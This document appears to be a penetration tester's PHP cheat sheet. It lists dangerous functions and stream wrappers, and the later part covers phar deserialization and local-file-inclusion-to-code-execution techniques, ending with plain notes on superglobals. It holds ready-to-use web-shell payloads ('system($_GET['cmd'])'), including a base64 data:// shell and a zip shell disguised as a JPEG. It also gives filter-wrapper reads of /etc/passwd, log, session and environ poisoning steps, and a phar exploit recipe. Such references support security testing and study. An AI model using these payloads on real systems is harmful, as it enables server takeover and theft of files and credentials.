PHP


PHP Interpreter Runtime
php -i
	--return phpinfo()
php file.php
	--execute non-interactive php script
php -f file.php
	--simple php file execute and parse
php -F file.php
	--execute interactive php script for every input line
php -R file.php
	--execute php after processing all input lines
php -a
	--run php interactively
php -S localhost:8888
	--run php built-in server on localhost at portno
	


Vulnerable functions
Local/Remote file inclusion:
include()
include_once()
require()
require_once()

Local/Remote command execution:
eval()
assert()
preg_replace()
fwrite()
passthru()
file_get_contents()
shell_exec()
system()
create_function()
include()
include_once()
require()
require_once()
``
exec()
popen()
pcntl_exec()
proc_open()
url_exec()
escapeshellarg()
escapeshellcmd()
ini_restore()
apache_setenv()
pclose()
proc_close()
proc_get_status()
proc_nice()
syslog()

SQL Injection:
mysql_query()

File/File system:
fopen()
readfile()
glob()
file()
popen()
exec()

List of Functions which accept callbacks
Function                     => Position of callback arguments
'ob_start'                   =>  0,
'array_diff_uassoc'          => -1,
'array_diff_ukey'            => -1,
'array_filter'               =>  1,
'array_intersect_uassoc'     => -1,
'array_intersect_ukey'       => -1,
'array_map'                  =>  0,
'array_reduce'               =>  1,
'array_udiff_assoc'          => -1,
'array_udiff_uassoc'         => array(-1, -2),
'array_udiff'                => -1,
'array_uintersect_assoc'     => -1,
'array_uintersect_uassoc'    => array(-1, -2),
'array_uintersect'           => -1,
'array_walk_recursive'       =>  1,
'array_walk'                 =>  1,
'assert_options'             =>  1,
'uasort'                     =>  1,
'uksort'                     =>  1,
'usort'                      =>  1,
'preg_replace_callback'      =>  1,
'spl_autoload_register'      =>  0,
'iterator_apply'             =>  1,
'call_user_func'             =>  0,
'call_user_func_array'       =>  0,
'register_shutdown_function' =>  0,
'register_tick_function'     =>  0,
'set_error_handler'          =>  0,
'set_exception_handler'      =>  0,
'session_set_save_handler'   => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate'    => array(2, 3),
'sqlite_create_function'     =>  2

Information Disclosure:
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid

Filesystem Functions:
// open filesystem handler
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
// write to filesystem (partially in combination with reading)
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng   - 2nd parameter is a path.
imagewbmp  - 2nd parameter is a path. 
image2wbmp - 2nd parameter is a path. 
imagejpeg  - 2nd parameter is a path.
imagexbm   - 2nd parameter is a path.
imagegif   - 2nd parameter is a path.
imagegd    - 2nd parameter is a path.
imagegd2   - 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
// read from filesystem
file_exists
file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
highlight_file
show_source
php_strip_whitespace
get_meta_tags

Other potential vuln functions:
extract - Opens the door for register_globals attacks (see study in scarlet).
parse_str -  works like extract if only one argument is given.  
putenv
ini_set
mail - has CRLF injection in the 3rd parameter, opens the door for spam. 
header - on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area. 
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
unserialize
str_repeat
register_tick_function
register_shutdown_function

GLOBAL VARIABLES
$_SERVER
$_GET
$_POST
$_FILE
$_COOKIE

WRAPPERS
php://filter
=php://filter/read=string.rot13/resource=index.php
=php://filter/convert.base64-encode/resource=index.php
=pHp://FilTer/convert.base64-encode/resource=index.php
=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
=php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s
zip://
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php
zip://shell.jpg%23payload.php
data://
=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
"<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
expect://
	--not enabled by default
=expect://id
=expect://ls
input://
=php://input
POST: <?php system('id'); ?>
file://
http://
	-requires that allow_url_fopen be enabled for outbound connectivity
ftp://
	-preferable to http to identify issues since most file operations will work with this wrapper (file writing, stat, unlink, rmdir, mkdir)
	--set up a server listening on a TCP, then attempt to cause the relevant ftp path to be accessed
zlib://
data://
glob://
phar://
	--Phar archives are similar in concept to Java JAR archives, but are tailored to the needs and to the flexibility of PHP applications
	---used to hold self-extracting or self-contained applications, in the same way that a Jar archive can be executed a Phar archive contains an executable stub containing PHP code
	--Phar archives can also contain meta-data; meta-data can be any PHP variable that can be serialized
	--meta-data is unserialized when a Phar archive is first accessed by any(!) file operation
	--possible unserialization attacks whenever a file operation occurs on a path whose beginning is controlled by an attacker
	---potentially vulnerable on either direct file operations [file_exists()] and inderact operations, e.g. xml external entity processing (chained xxe exploit)
	-Methodology:
		1. Place a valid Phar archive containing the payload object onto the target's local file system
		2. Trigger a file operation on a "phar://" path referring to the file
		--identify vuln allowing stage 2 before stage 1
// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');
// add object of any class as meta data
class AnyClass {}
$object = new AnyClass;
$object->data = 'rips';
$phar->setMetadata($object);
$phar->stopBuffering();
class AnyClass {
    function __destruct() {
        echo $this->data;
    }
}
// output: rips
include('phar://test.phar');
// If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked
// NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, file_exists and many more.
	Phar File Format elements
		Stub
			to act as a self-extracting archive the stub is PHP code executed when the file is accessed in an executable context
			minimal stub: <?php __HALT_COMPILER();
		Signature (optional - [required for the archive to be loaded by PHP in default configuration])
			4 byte "magic" identification value "GBMB", 4 bytes to identify the signature type (MD5, SHA1, SHA256 or SHA512) and the signature itself
		Meta-data (optional)
			metadata may contain any serialized PHP object represented in the standard PHP format
	3 base formats in which Phar archive data may be stored:
		Phar
		Tar
		Zip
		--Tar format allows the construction of files that are both valid Phar/Tar archives and also valid as other file types
			---format used is "modern" USTAR
	-if another file format allows arbitrary data of sufficient length within its first 100 bytes then a file can be constructed which is both valid under the targeted format and a valid Phar/Tar archive
		--E.g. attack may construct a valid jpeg file that is also a valid Phar archive, because JPEG file format has an arbitrary length description field which is given within the first 100 bytes
	-If attacker has complete control of a string within the $_SESSION array which occurs within the first 100 bytes we can use a similar technique to cause the session file to be a valid Phar/Tar archive

LFI TO RCE
/proc/*/fd
>repeatedly upload shell
=/proc/$PID/fd/$FD //with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)
=/proc/666/fd/1151

/proc/self/environ
=../../../proc/self/environ
User-Agent: <?=phpinfo(); ?>

file metadata upload
=path/to/uploaded/file.png
e.g. location: <?php system($_GET['c']); ?>

phpinfo()
https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
https://www.insomniasec.com/downloads/publications/phpinfolfi.py

log poisoning
=/var/log/apache/access.log
=/var/log/apache/error.log
=/var/log/vsftpd.log
=/var/log/sshd.log
=/var/log/mail
=/var/log/httpd/error_log
=/usr/local/apache/log/error_log
=/usr/local/apache2/log/error_log


PHP Sessions (PHPSESSID)
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
/var/lib/php5/sess_[PHPSESSID]
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
*set cookie <?php system('cat /etc/passwd');?>
e.g. login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
Exploit LFI to include PHP session file =/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27


Identifying File Path Handling Vulnerabilities
	treat all file operations as sinks and attempt to find paths from user-controlled data (sources) to these sinks
		--if we are not able to directly upload files through the target application there are other avenues (e.g. temporary files) we can consider to place full or partially controlled content on the local file system



SUPERGLOBAL variables index:
$GLOBALS
$_SERVER
$_REQUEST
$_POST
$_GET
$_FILES
$_ENV
$_COOKIE
$_SESSION

$_SERVER
	$_SERVER is a PHP super global variable which holds information about headers, paths, and script locations.
$_SERVER['PHP_SELF']	Returns the filename of the currently executing script
$_SERVER['GATEWAY_INTERFACE']	Returns the version of the Common Gateway Interface (CGI) the server is using
$_SERVER['SERVER_ADDR']	Returns the IP address of the host server
$_SERVER['SERVER_NAME']	Returns the name of the host server (such as www.w3schools.com)
$_SERVER['SERVER_SOFTWARE']	Returns the server identification string (such as Apache/2.2.24)
$_SERVER['SERVER_PROTOCOL']	Returns the name and revision of the information protocol (such as HTTP/1.1)
$_SERVER['REQUEST_METHOD']	Returns the request method used to access the page (such as POST)
$_SERVER['REQUEST_TIME']	Returns the timestamp of the start of the request (such as 1377687496)
$_SERVER['QUERY_STRING']	Returns the query string if the page is accessed via a query string
$_SERVER['HTTP_ACCEPT']	Returns the Accept header from the current request
$_SERVER['HTTP_ACCEPT_CHARSET']	Returns the Accept_Charset header from the current request (such as utf-8,ISO-8859-1)
$_SERVER['HTTP_HOST']	Returns the Host header from the current request
$_SERVER['HTTP_REFERER']	Returns the complete URL of the page from which the current page was called
$_SERVER['HTTPS']	Is the script queried through a secure HTTP protocol
$_SERVER['REMOTE_ADDR']	Returns the IP address from where the user is viewing the current page
$_SERVER['REMOTE_HOST']	Returns the Host name from where the user is viewing the current page
$_SERVER['REMOTE_PORT']	Returns the port being used on the user's machine to communicate with the web server
$_SERVER['SCRIPT_FILENAME']	Returns the absolute pathname of the currently executing script
$_SERVER['SERVER_ADMIN']	Returns the value given to the SERVER_ADMIN directive in the web server configuration file (if your script runs on a virtual host, it will be the value defined for that virtual host) (such as someone@w3schools.com)
$_SERVER['SERVER_PORT']	Returns the port on the server machine being used by the web server for communication (such as 80)
$_SERVER['SERVER_SIGNATURE']	Returns the server version and virtual host name which are added to server-generated pages
$_SERVER['PATH_TRANSLATED']	Returns the file system based path to the current script
$_SERVER['SCRIPT_NAME']	Returns the path of the current script
$_SERVER['SCRIPT_URI']	Returns the URI of the current page

$_REQUEST
	$_REQUEST is used to collect data after submitting an HTML form

$_POST
	$_POST is widely used to collect form data after submitting an HTML form with method="post".
	$_POST is also widely used to pass variables.

$_GET
	$_GET can also be used to collect form data after submitting an HTML form with method="get".
	$_GET can also collect data sent in the URL.

$_FILES

$_ENV

$_COOKIE

$_SESSION

